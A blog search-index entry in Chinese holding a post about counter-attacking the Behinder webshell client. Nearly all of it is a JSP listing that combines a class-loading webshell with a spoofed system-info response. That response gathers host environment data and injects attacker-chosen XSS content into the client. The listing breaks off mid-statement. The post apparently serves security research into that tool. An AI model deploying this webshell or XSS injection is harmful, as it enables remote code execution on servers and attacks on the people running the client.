<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>冰蝎客户端反制的分析和复现</title>
      <link href="/2023/08/16/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%88%B6%E7%9A%84%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/08/16/%E5%86%B0%E8%9D%8E%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%8F%8D%E5%88%B6%E7%9A%84%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h1><p>beichen发了个反制冰蝎的视频，想看看如何做到的。</p><h1 id="寻找资料"><a href="#寻找资料" class="headerlink" title="寻找资料"></a>寻找资料</h1><p>群里师傅给我发了个冰蝎XSS的链接</p><blockquote><p><a href="http://www.lvyyevd.cn/archives/gei-ni-yi-ge-da-bi-dou-zi-zhi-bing-xie-xss">http://www.lvyyevd.cn/archives/gei-ni-yi-ge-da-bi-dou-zi-zhi-bing-xie-xss</a></p></blockquote><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br></pre></td><td class="code"><pre><span class="line">&lt;%<span class="meta">@page</span> <span class="keyword">import</span>=<span class="string">&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;</span>%&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.NetworkInterface&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.InetAddress&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.Inet4Address&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Method&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.File&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.NetworkInterface&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.InetAddress&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.Inet4Address&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.crypto.spec.SecretKeySpec&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.crypto.Cipher&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Files&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.nio.file.Paths&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStreamReader&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.FileInputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.BufferedReader&quot;</span> %&gt;</span><br><span class="line">&lt;%!<span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">    U(ClassLoader c)&#123;<span class="built_in">super</span>(c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);</span><br><span class="line">&#125;&#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    Boolean <span class="title function_">isGetBaseinfo</span><span class="params">(<span class="type">byte</span>[] mBaseData)</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] src = <span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">98</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">105</span>, <span class="number">99</span>, <span class="number">73</span>, <span class="number">110</span>, <span class="number">102</span>, <span class="number">111</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &lt; mBaseData.length) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mBaseData[i] == src[<span class="number">0</span>]) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; <span class="number">9</span>; j = j + <span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (mBaseData[i + j] == src[j] &amp;&amp; j == <span class="number">8</span>) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mBaseData[i + j] != src[j]) &#123;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line">                i++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span>  <span class="title class_">Hbrynvsrja</span> &#123;</span><br><span class="line">        <span class="comment">//        public static String whatever;</span></span><br><span class="line">        <span class="keyword">private</span> Object Request;</span><br><span class="line">        <span class="keyword">private</span> Object Response;</span><br><span class="line">        <span class="keyword">private</span> Object Session;</span><br><span class="line">        <span class="keyword">private</span> String key;</span><br><span class="line">        <span class="keyword">private</span> String xssFilepath;</span><br><span class="line">        <span class="keyword">private</span> String xssData;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">Hbrynvsrja</span><span class="params">(String key,String xssFilepath,String xssData)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.key = key;</span><br><span class="line">            <span class="built_in">this</span>.xssFilepath = xssFilepath;</span><br><span class="line">            <span class="built_in">this</span>.xssData = xssData;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getData</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">            <span class="type">HashMap</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">var22</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">            Object so;</span><br><span class="line">            Method write;</span><br><span class="line">            label132: &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    var22 = <span class="literal">true</span>;</span><br><span class="line">                    <span class="built_in">this</span>.fillContext(obj);</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">basicInfo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;环境变量:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">                    Map&lt;String, String&gt; env = System.getenv();</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var5</span> <span class="operator">=</span> env.keySet().iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var5.hasNext()) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String)var5.next();</span><br><span class="line">                        basicInfo.append(name + <span class="string">&quot;=&quot;</span> + (String)env.get(name) + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    basicInfo.append(<span class="string">&quot;&lt;br/&gt;&lt;font size=2 color=red&gt;JRE系统属性:&lt;/font&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">                    <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> System.getProperties();</span><br><span class="line">                    Set&lt;Map.Entry&lt;Object, Object&gt;&gt; entrySet = props.entrySet();</span><br><span class="line">                    <span class="type">Iterator</span> <span class="variable">var7</span> <span class="operator">=</span> entrySet.iterator();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(var7.hasNext()) &#123;</span><br><span class="line">                        Map.Entry&lt;Object, Object&gt; entry = (Map.Entry)var7.next();</span><br><span class="line">                        basicInfo.append(entry.getKey() + <span class="string">&quot; = &quot;</span> + entry.getValue() + <span class="string">&quot;&lt;br/&gt;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">currentPath</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;&quot;</span>)).getAbsolutePath();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">driveList</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    File[] roots = File.listRoots();</span><br><span class="line">                    File[] var10 = roots;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">var11</span> <span class="operator">=</span> roots.length;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">var12</span> <span class="operator">=</span> <span class="number">0</span>; var12 &lt; var11; ++var12) &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">f</span> <span class="operator">=</span> var10[var12];</span><br><span class="line">                        driveList = driveList + f.getPath() + <span class="string">&quot;;&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="type">String</span> <span class="variable">osInfo</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>) + System.getProperty(<span class="string">&quot;os.version&quot;</span>) + System.getProperty(<span class="string">&quot;os.arch&quot;</span>);</span><br><span class="line">                    Map&lt;String, String&gt; entity = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                    <span class="comment">//xss设置</span></span><br><span class="line">                    <span class="comment">//xss设置</span></span><br><span class="line">                    <span class="type">String</span> <span class="variable">content</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">                    <span class="keyword">if</span> (<span class="built_in">this</span>.xssFilepath != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="built_in">this</span>.xssFilepath);</span><br><span class="line">                        <span class="type">InputStreamReader</span> <span class="variable">streamReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file), <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                        <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(streamReader);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">while</span> ((content = bufferedReader.readLine()) != <span class="literal">null</span>)</span><br><span class="line">                            builder.append(content);</span><br><span class="line">                    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                        builder.append(<span class="built_in">this</span>.xssData);</span><br><span class="line">                    &#125;</span><br><span class="line">                    entity.put(<span class="string">&quot;basicInfo&quot;</span>, builder.toString());</span><br><span class="line">                    entity.put(<span class="string">&quot;currentPath&quot;</span>, currentPath);</span><br><span class="line">                    entity.put(<span class="string">&quot;driveList&quot;</span>, driveList);</span><br><span class="line">                    entity.put(<span class="string">&quot;osInfo&quot;</span>, osInfo);</span><br><span class="line">                    entity.put(<span class="string">&quot;arch&quot;</span>, System.getProperty(<span class="string">&quot;os.arch&quot;</span>));</span><br><span class="line">                    entity.put(<span class="string">&quot;localIp&quot;</span>, <span class="built_in">this</span>.getInnerIp());</span><br><span class="line">                    result.put(<span class="string">&quot;status&quot;</span>, <span class="string">&quot;success&quot;</span>);</span><br><span class="line">                    result.put(<span class="string">&quot;msg&quot;</span>, <span class="built_in">this</span>.buildJson(entity, <span class="literal">true</span>));</span><br><span class="line">                    var22 = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span> label132;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var26) &#123;</span><br><span class="line">                    var22 = <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (var22) &#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.Encrypt(<span class="built_in">this</span>.buildJson(result, <span class="literal">true</span>).getBytes(<span class="string">&quot;UTF-8&quot;</span>)),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception var23) &#123;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.Encrypt(<span class="built_in">this</span>.buildJson(result, <span class="literal">true</span>).getBytes(<span class="string">&quot;UTF-8&quot;</span>)),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception var24) &#123;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="built_in">this</span>.Encrypt(<span class="built_in">this</span>.buildJson(result, <span class="literal">true</span>).getBytes(<span class="string">&quot;UTF-8&quot;</span>)),<span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var25) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;asd&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String <span class="title function_">getInnerIp</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Enumeration&lt;NetworkInterface&gt; netInterfaces = NetworkInterface.getNetworkInterfaces();</span><br><span class="line">                <span class="type">InetAddress</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">while</span>(netInterfaces.hasMoreElements()) &#123;</span><br><span class="line">                    <span class="type">NetworkInterface</span> <span class="variable">netInterface</span> <span class="operator">=</span> (NetworkInterface)netInterfaces.nextElement();</span><br><span class="line">                    Enumeration&lt;InetAddress&gt; addresses = netInterface.getInetAddresses();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(addresses.hasMoreElements()) &#123;</span><br><span class="line">                        ip = (InetAddress)addresses.nextElement();</span><br><span class="line">                        <span class="keyword">if</span> (ip != <span class="literal">null</span> &amp;&amp; ip <span class="keyword">instanceof</span> Inet4Address) &#123;</span><br><span class="line">                            ips = ips + ip.getHostAddress() + <span class="string">&quot; &quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            ips = ips.replace(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>).trim();</span><br><span class="line">            <span class="keyword">return</span> ips;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String <span class="title function_">buildJson</span><span class="params">(Map&lt;String, String&gt; entity, <span class="type">boolean</span> encode)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;&#123;&quot;</span>);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var5</span> <span class="operator">=</span> entity.keySet().iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var5.hasNext()) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">key</span> <span class="operator">=</span> (String)var5.next();</span><br><span class="line">                sb.append(<span class="string">&quot;\&quot;&quot;</span> + key + <span class="string">&quot;\&quot;:\&quot;&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> ((String)entity.get(key)).toString();</span><br><span class="line">                <span class="keyword">if</span> (encode) &#123;</span><br><span class="line">                    Class Base64;</span><br><span class="line">                    Object Encoder;</span><br><span class="line">                    <span class="keyword">if</span> (version.compareTo(<span class="string">&quot;1.9&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.getClass();</span><br><span class="line">                        Base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                        Encoder = Base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, (Class[])<span class="literal">null</span>).invoke(Base64, (Object[])<span class="literal">null</span>);</span><br><span class="line">                        value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="built_in">this</span>.getClass();</span><br><span class="line">                        Base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                        Encoder = Base64.newInstance();</span><br><span class="line">                        value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, value.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                        value = value.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                sb.append(value);</span><br><span class="line">                sb.append(<span class="string">&quot;\&quot;,&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            sb.setLength(sb.length() - <span class="number">1</span>);</span><br><span class="line">            sb.append(<span class="string">&quot;&#125;&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> sb.toString();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String <span class="title function_">base64encode</span><span class="params">(<span class="type">byte</span>[] data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">version</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;java.version&quot;</span>);</span><br><span class="line"></span><br><span class="line">            Class Base64;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.getClass();</span><br><span class="line">                Base64 = Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> Base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, (Class[])<span class="literal">null</span>).invoke(Base64, (Object[])<span class="literal">null</span>);</span><br><span class="line">                result = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, data);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var7) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getClass();</span><br><span class="line">                Base64 = Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>);</span><br><span class="line">                <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> Base64.newInstance();</span><br><span class="line">                result = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="type">byte</span>[].class).invoke(Encoder, data);</span><br><span class="line">                result = result.replace(<span class="string">&quot;\n&quot;</span>, <span class="string">&quot;&quot;</span>).replace(<span class="string">&quot;\r&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">fillContext</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (obj.getClass().getName().indexOf(<span class="string">&quot;PageContext&quot;</span>) &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.Request = obj.getClass().getMethod(<span class="string">&quot;getRequest&quot;</span>).invoke(obj);</span><br><span class="line">                <span class="built_in">this</span>.Response = obj.getClass().getMethod(<span class="string">&quot;getResponse&quot;</span>).invoke(obj);</span><br><span class="line">                <span class="built_in">this</span>.Session = obj.getClass().getMethod(<span class="string">&quot;getSession&quot;</span>).invoke(obj);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                Map&lt;String, Object&gt; objMap = (Map)obj;</span><br><span class="line">                <span class="built_in">this</span>.Session = objMap.get(<span class="string">&quot;session&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.Response = 